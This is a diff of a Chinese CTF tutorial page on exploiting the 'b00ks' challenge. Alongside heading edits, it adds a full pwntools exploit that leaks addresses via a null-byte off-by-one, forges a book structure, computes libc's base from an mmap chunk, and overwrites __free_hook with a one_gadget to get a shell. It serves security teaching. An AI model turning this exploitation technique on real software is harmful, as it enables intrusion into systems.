@@ -4311,7 +4311,7 @@ if ( book )
 </pre></div>
 
 <h2 id="_12">利用<a class="headerlink" href="#_12" title="Permanent link">&para;</a></h2>
-<h3 id="1_1">1.泄漏<a class="headerlink" href="#1_1" title="Permanent link">&para;</a></h3>
+<h3 id="_13">泄漏<a class="headerlink" href="#_13" title="Permanent link">&para;</a></h3>
 <p>因为程序中的my_read函数存在null byte off-by-one，事实上my_read读入的结束符'\x00'是写入到0x555555756060的位置的。这样当0x555555756060～0x555555756068写入book指针时就会覆盖掉结束符'\x00'，所以这里是存在一个地址泄漏的漏洞。通过打印author name就可以获得pointer array中第一项的值。</p>
 <div class="codehilite"><pre><span></span>0x555555756040: 0x6161616161616161  0x6161616161616161
 0x555555756050: 0x6161616161616161  0x6161616161616161   &lt;== author name
@@ -4356,7 +4356,7 @@ book1_addr=book1_addr.ljust(8,&#39;\x00&#39;)
 book1_addr=u64(book1_addr)
 </pre></div>
 
-<h3 id="2off-by-one">2.off-by-one覆盖指针低字节<a class="headerlink" href="#2off-by-one" title="Permanent link">&para;</a></h3>
+<h3 id="off-by-one_2">off-by-one覆盖指针低字节<a class="headerlink" href="#off-by-one_2" title="Permanent link">&para;</a></h3>
 <p>程序中同样提供了一种change功能，change功能用于修改author name，所以通过change可以写入author name，利用off-by-one覆盖pointer array第一个项的低字节。</p>
 <p>覆盖掉book1指针的低字节后，这个指针会指向book1的description，由于程序提供了edit功能可以任意修改description中的内容。我们可以提前在description中布置数据伪造成一个book结构，这个book结构的description和name指针可以由直接控制。</p>
 <div class="codehilite"><pre><span></span>def off_by_one(addr):
@@ -4376,7 +4376,7 @@ book1_addr=u64(book1_addr)
 
 <p>这里在description中伪造了book，使用的数据是p64(0x1)+p64(addr)+p64(addr)+pack(0xffff)。
 其中addr+58是为了使指针指向book2的指针地址，使得我们可以任意修改这些指针值。</p>
-<h3 id="3">3.通过栈实现利用<a class="headerlink" href="#3" title="Permanent link">&para;</a></h3>
+<h3 id="_14">通过栈实现利用<a class="headerlink" href="#_14" title="Permanent link">&para;</a></h3>
 <p>通过前面2部分我们已经获得了任意地址读写的能力，读者读到这里可能会觉得下面的操作是显而易见的，比如写got表劫持流程或者写__malloc_hook劫持流程等。但是这个题目特殊之处在于开启PIE并且没有泄漏libc基地址的方法，因此我们还需要想一下其他的办法。</p>
 <p>这道题的巧妙之处在于在分配第二个book时，使用一个很大的尺寸，使得堆以mmap模式进行拓展。我们知道堆有两种拓展方式一种是brk会直接拓展原来的堆，另一种是mmap会单独映射一块内存。</p>
 <p>在这里我们申请一个超大的块，来使用mmap扩展内存。因为mmap分配的内存与libc之前存在固定的偏移因此可以推算出libc的基地址。
@@ -4417,6 +4417,100 @@ book1_addr=u64(book1_addr)
 0x00007fffec59c000 0x00007fffec59f000 0x0000000000000000 r-- [vvar]
 0x00007fffec59f000 0x00007fffec5a1000 0x0000000000000000 r-x [vdso]
 0xffffffffff600000 0xffffffffff601000 0x0000000000000000 r-x [vsyscall]
+</pre></div>
+
+<h3 id="exp">EXP<a class="headerlink" href="#exp" title="Permanent link">&para;</a></h3>
+<div class="codehilite"><pre><span></span><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="n">context</span><span class="o">.</span><span class="n">log_level</span><span class="o">=</span><span class="s2">&quot;info&quot;</span>
+
+<span class="n">binary</span><span class="o">=</span><span class="n">ELF</span><span class="p">(</span><span class="s2">&quot;b00ks&quot;</span><span class="p">)</span>
+<span class="n">libc</span><span class="o">=</span><span class="n">ELF</span><span class="p">(</span><span class="s2">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span><span class="p">)</span>
+<span class="n">io</span><span class="o">=</span><span class="n">process</span><span class="p">(</span><span class="s2">&quot;./b00ks&quot;</span><span class="p">)</span>
+
+
+<span class="k">def</span> <span class="nf">createbook</span><span class="p">(</span><span class="n">name_size</span><span class="p">,</span><span class="n">name</span><span class="p">,</span><span class="n">des_size</span><span class="p">,</span><span class="n">des</span><span class="p">):</span>
+    <span class="n">io</span><span class="o">.</span><span class="n">readuntil</span><span class="p">(</span><span class="s2">&quot;&gt; &quot;</span><span class="p">)</span>
+    <span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s2">&quot;1&quot;</span><span class="p">)</span>
+    <span class="n">io</span><span class="o">.</span><span class="n">readuntil</span><span class="p">(</span><span class="s2">&quot;: &quot;</span><span class="p">)</span>
+    <span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">name_size</span><span class="p">))</span>
+    <span class="n">io</span><span class="o">.</span><span class="n">readuntil</span><span class="p">(</span><span class="s2">&quot;: &quot;</span><span class="p">)</span>
+    <span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">name</span><span class="p">)</span>
+    <span class="n">io</span><span class="o">.</span><span class="n">readuntil</span><span class="p">(</span><span class="s2">&quot;: &quot;</span><span class="p">)</span>
+    <span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">des_size</span><span class="p">))</span>
+    <span class="n">io</span><span class="o">.</span><span class="n">readuntil</span><span class="p">(</span><span class="s2">&quot;: &quot;</span><span class="p">)</span>
+    <span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">des</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">printbook</span><span class="p">(</span><span class="nb">id</span><span class="p">):</span>
+    <span class="n">io</span><span class="o">.</span><span class="n">readuntil</span><span class="p">(</span><span class="s2">&quot;&gt; &quot;</span><span class="p">)</span>
+    <span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s2">&quot;4&quot;</span><span class="p">)</span>
+    <span class="n">io</span><span class="o">.</span><span class="n">readuntil</span><span class="p">(</span><span class="s2">&quot;: &quot;</span><span class="p">)</span>
+    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="nb">id</span><span class="p">):</span>
+        <span class="n">book_id</span><span class="o">=</span><span class="nb">int</span><span class="p">(</span><span class="n">io</span><span class="o">.</span><span class="n">readline</span><span class="p">()[:</span><span class="o">-</span><span class="mi">1</span><span class="p">])</span>
+        <span class="n">io</span><span class="o">.</span><span class="n">readuntil</span><span class="p">(</span><span class="s2">&quot;: &quot;</span><span class="p">)</span>
+        <span class="n">book_name</span><span class="o">=</span><span class="n">io</span><span class="o">.</span><span class="n">readline</span><span class="p">()[:</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span>
+        <span class="n">io</span><span class="o">.</span><span class="n">readuntil</span><span class="p">(</span><span class="s2">&quot;: &quot;</span><span class="p">)</span>
+        <span class="n">book_des</span><span class="o">=</span><span class="n">io</span><span class="o">.</span><span class="n">readline</span><span class="p">()[:</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span>
+        <span class="n">io</span><span class="o">.</span><span class="n">readuntil</span><span class="p">(</span><span class="s2">&quot;: &quot;</span><span class="p">)</span>
+        <span class="n">book_author</span><span class="o">=</span><span class="n">io</span><span class="o">.</span><span class="n">readline</span><span class="p">()[:</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span>
+    <span class="k">return</span> <span class="n">book_id</span><span class="p">,</span><span class="n">book_name</span><span class="p">,</span><span class="n">book_des</span><span class="p">,</span><span class="n">book_author</span>
+
+<span class="k">def</span> <span class="nf">createname</span><span class="p">(</span><span class="n">name</span><span class="p">):</span>
+    <span class="n">io</span><span class="o">.</span><span class="n">readuntil</span><span class="p">(</span><span class="s2">&quot;name: &quot;</span><span class="p">)</span>
+    <span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">name</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">changename</span><span class="p">(</span><span class="n">name</span><span class="p">):</span>
+    <span class="n">io</span><span class="o">.</span><span class="n">readuntil</span><span class="p">(</span><span class="s2">&quot;&gt; &quot;</span><span class="p">)</span>
+    <span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s2">&quot;5&quot;</span><span class="p">)</span>
+    <span class="n">io</span><span class="o">.</span><span class="n">readuntil</span><span class="p">(</span><span class="s2">&quot;: &quot;</span><span class="p">)</span>
+    <span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">name</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">editbook</span><span class="p">(</span><span class="n">book_id</span><span class="p">,</span><span class="n">new_des</span><span class="p">):</span>
+    <span class="n">io</span><span class="o">.</span><span class="n">readuntil</span><span class="p">(</span><span class="s2">&quot;&gt; &quot;</span><span class="p">)</span>
+    <span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s2">&quot;3&quot;</span><span class="p">)</span>
+    <span class="n">io</span><span class="o">.</span><span class="n">readuntil</span><span class="p">(</span><span class="s2">&quot;: &quot;</span><span class="p">)</span>
+    <span class="n">io</span><span class="o">.</span><span class="n">writeline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">book_id</span><span class="p">))</span>
+    <span class="n">io</span><span class="o">.</span><span class="n">readuntil</span><span class="p">(</span><span class="s2">&quot;: &quot;</span><span class="p">)</span>
+    <span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">new_des</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">deletebook</span><span class="p">(</span><span class="n">book_id</span><span class="p">):</span>
+    <span class="n">io</span><span class="o">.</span><span class="n">readuntil</span><span class="p">(</span><span class="s2">&quot;&gt; &quot;</span><span class="p">)</span>
+    <span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s2">&quot;2&quot;</span><span class="p">)</span>
+    <span class="n">io</span><span class="o">.</span><span class="n">readuntil</span><span class="p">(</span><span class="s2">&quot;: &quot;</span><span class="p">)</span>
+    <span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">book_id</span><span class="p">))</span>
+
+<span class="n">createname</span><span class="p">(</span><span class="s2">&quot;A&quot;</span><span class="o">*</span><span class="mi">32</span><span class="p">)</span>
+<span class="n">createbook</span><span class="p">(</span><span class="mi">128</span><span class="p">,</span><span class="s2">&quot;a&quot;</span><span class="p">,</span><span class="mi">32</span><span class="p">,</span><span class="s2">&quot;a&quot;</span><span class="p">)</span>
+<span class="n">createbook</span><span class="p">(</span><span class="mh">0x21000</span><span class="p">,</span><span class="s2">&quot;a&quot;</span><span class="p">,</span><span class="mh">0x21000</span><span class="p">,</span><span class="s2">&quot;b&quot;</span><span class="p">)</span>
+
+
+<span class="n">book_id_1</span><span class="p">,</span><span class="n">book_name</span><span class="p">,</span><span class="n">book_des</span><span class="p">,</span><span class="n">book_author</span><span class="o">=</span><span class="n">printbook</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+<span class="n">book1_addr</span><span class="o">=</span><span class="n">u64</span><span class="p">(</span><span class="n">book_author</span><span class="p">[</span><span class="mi">32</span><span class="p">:</span><span class="mi">32</span><span class="o">+</span><span class="mi">6</span><span class="p">]</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">))</span>
+<span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s2">&quot;book1_address:&quot;</span><span class="o">+</span><span class="nb">hex</span><span class="p">(</span><span class="n">book1_addr</span><span class="p">))</span>
+
+<span class="n">payload</span><span class="o">=</span><span class="n">p64</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">book1_addr</span><span class="o">+</span><span class="mh">0x38</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">book1_addr</span><span class="o">+</span><span class="mh">0x40</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0xffff</span><span class="p">)</span>
+<span class="n">editbook</span><span class="p">(</span><span class="n">book_id_1</span><span class="p">,</span><span class="n">payload</span><span class="p">)</span>
+<span class="n">changename</span><span class="p">(</span><span class="s2">&quot;A&quot;</span><span class="o">*</span><span class="mi">32</span><span class="p">)</span>
+<span class="n">book_id_1</span><span class="p">,</span><span class="n">book_name</span><span class="p">,</span><span class="n">book_des</span><span class="p">,</span><span class="n">book_author</span><span class="o">=</span><span class="n">printbook</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+<span class="n">book2_name_addr</span><span class="o">=</span><span class="n">u64</span><span class="p">(</span><span class="n">book_name</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span><span class="s2">&quot;</span><span class="se">\x00</span><span class="s2">&quot;</span><span class="p">))</span>
+<span class="n">book2_des_addr</span><span class="o">=</span><span class="n">u64</span><span class="p">(</span><span class="n">book_des</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span><span class="s2">&quot;</span><span class="se">\x00</span><span class="s2">&quot;</span><span class="p">))</span>
+<span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s2">&quot;book2 name addr:&quot;</span><span class="o">+</span><span class="nb">hex</span><span class="p">(</span><span class="n">book2_name_addr</span><span class="p">))</span>
+<span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s2">&quot;book2 des addr:&quot;</span><span class="o">+</span><span class="nb">hex</span><span class="p">(</span><span class="n">book2_des_addr</span><span class="p">))</span>
+<span class="n">libc_base</span><span class="o">=</span><span class="n">book2_des_addr</span><span class="o">-</span><span class="mh">0x5b9010</span>
+<span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s2">&quot;libc base:&quot;</span><span class="o">+</span><span class="nb">hex</span><span class="p">(</span><span class="n">libc_base</span><span class="p">))</span>
+
+<span class="n">free_hook</span><span class="o">=</span><span class="n">libc_base</span><span class="o">+</span><span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s2">&quot;__free_hook&quot;</span><span class="p">]</span>
+<span class="n">one_gadget</span><span class="o">=</span><span class="n">libc_base</span><span class="o">+</span><span class="mh">0x4f322</span> <span class="c1">#0x4f2c5 0x10a38c 0x4f322</span>
+<span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s2">&quot;free_hook:&quot;</span><span class="o">+</span><span class="nb">hex</span><span class="p">(</span><span class="n">free_hook</span><span class="p">))</span>
+<span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s2">&quot;one_gadget:&quot;</span><span class="o">+</span><span class="nb">hex</span><span class="p">(</span><span class="n">one_gadget</span><span class="p">))</span>
+<span class="n">editbook</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="n">p64</span><span class="p">(</span><span class="n">free_hook</span><span class="p">)</span><span class="o">*</span><span class="mi">2</span><span class="p">)</span>
+<span class="n">editbook</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span><span class="n">p64</span><span class="p">(</span><span class="n">one_gadget</span><span class="p">))</span>
+<span class="c1">#gdb.attach(io)</span>
+
+
+<span class="n">deletebook</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
+
+
+<span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
 </pre></div>
                 
                   
